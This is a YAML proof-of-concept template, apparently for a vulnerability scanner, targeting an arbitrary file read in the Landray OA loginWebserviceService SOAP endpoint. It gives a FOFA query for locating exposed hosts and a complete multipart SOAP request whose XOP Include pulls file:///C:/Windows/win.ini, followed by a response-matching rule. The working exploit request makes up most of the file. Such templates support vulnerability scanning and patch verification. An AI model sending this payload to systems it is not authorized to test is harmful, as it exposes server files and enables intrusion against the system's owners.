pocs/unverified/landray-oa-loginWebserviceService-fileread.yml

id: landray-oa-loginWebserviceService-fileread
info:
  name: Landray OA loginWebserviceService File Read
  author: ZacharyZcR
  severity: high
  description: |
    Landray OA System loginWebserviceService interface has an arbitrary file read vulnerability.
    The vulnerability exists in the getLoginSessionId method which can be exploited to read arbitrary files on the system.
    FOFA: body="Com_Parameter"
  reference:
    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3sysFormMainDataInsystemWebservice%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md

rules:
  r0:
    request:
      method: POST
      path: /sys/webservice/loginWebserviceService
      headers:
        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
      body: |
        ------4upt9dwdca8rtwq9osuz
        Content-Disposition: form-data; name="a"
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://sso.authentication.sys.kmss.landray.com/">
        <soapenv:Header/>
        <soapenv:Body>
            <web:getLoginSessionId>
                <arg0>
                    <beginTimeStamp>a</beginTimeStamp>
                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
                </arg0>
            </web:getLoginSessionId>
        </soapenv:Body>
        </soapenv:Envelope>
        ------4upt9dwdca8rtwq9osuz--

    expression: response.status == 500 && response.body.bcontains(b'<soap:Envelope') && response.body.bcontains(b'<faultstring>') && response.body.bcontains(b'Unmarshalling Error')

expression: r0()